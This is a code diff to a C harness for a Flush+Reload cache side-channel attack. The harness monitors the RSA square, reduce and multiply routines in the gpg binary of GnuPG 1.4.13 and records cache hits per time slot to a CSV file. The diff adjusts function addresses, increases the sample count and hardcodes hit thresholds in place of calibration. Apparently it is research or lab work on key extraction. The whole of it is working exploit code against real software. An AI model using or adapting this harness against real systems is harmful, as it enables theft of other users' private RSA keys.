@@ -1,13 +1,8 @@
 #include "fr/fr.h"
 
-//0xbb9e5
-#define RSA_SQUARE (void*) 0xbba00
-
-//0xbaf9f
-#define RSA_REDUCE (void*) 0xbafc0
-
-//0xbb367
-#define RSA_MULTIPLY (void*) 0xbb380
+#define RSA_SQUARE (void*)0xbb9e5
+#define RSA_REDUCE (void*)0xbaf9f
+#define RSA_MULTIPLY (void*)0xbb367
 
 #define RSA_SQUARE_IDX 1
 #define RSA_REDUCE_IDX 2
@@ -15,10 +10,11 @@
 
 int main(int argc, char** argv) {
 
-	//order: square, reduce, multiply
-	FR fr = fr_init( 2048*3, RSA_SQUARE, RSA_REDUCE, RSA_MULTIPLY);
+	FR fr = fr_init( 2048*100, RSA_SQUARE, RSA_REDUCE, RSA_MULTIPLY);
 
-	fr_calibrate(&fr, 1.0, 10000000, "scripts/calibration.csv");
+	fr.hit_begin=0;
+	fr.hit_end=230;
+	//fr_calibrate(&fr, 1.0, 1000000, "scripts/calibration.csv");
 
 	fr_monitor_elf(&fr, "gnupg-1.4.13/g10/gpg");
 
@@ -26,7 +22,7 @@ int main(int argc, char** argv) {
 
 	// create csv
 	fprintf(file, "timeslot, square, reduce, multiply\n");
-	for(unsigned int i=0; i < fr.res_len; i++) {
+	for(unsigned int i=0; i < fr.num_time_slots; i++) {
 
 		fprintf(file, "%u, %u, %u, %u\n",
 				i,
